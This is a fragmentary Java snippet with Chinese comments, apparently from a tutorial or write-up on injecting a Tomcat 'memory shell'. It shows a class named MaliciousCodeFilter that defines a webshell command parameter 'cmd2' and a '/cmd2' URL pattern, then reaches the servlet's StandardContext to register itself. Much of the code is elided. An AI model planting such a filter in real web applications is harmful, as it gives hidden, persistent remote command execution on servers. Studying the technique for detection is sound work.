...
/**
 * Step2: 获取Context，注入内存马
 */
public class MaliciousCodeFilter implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "cmd2";
    private final static String filterUrlPattern = "/cmd2";
    private final static String filterName = "KpLi0rn222";
        ...
        try {
            ...
            if (servletContext != null){
                ...
                if (standardContext != null){
                    ...
                    Filter myFilter =new MaliciousCodeFilter();
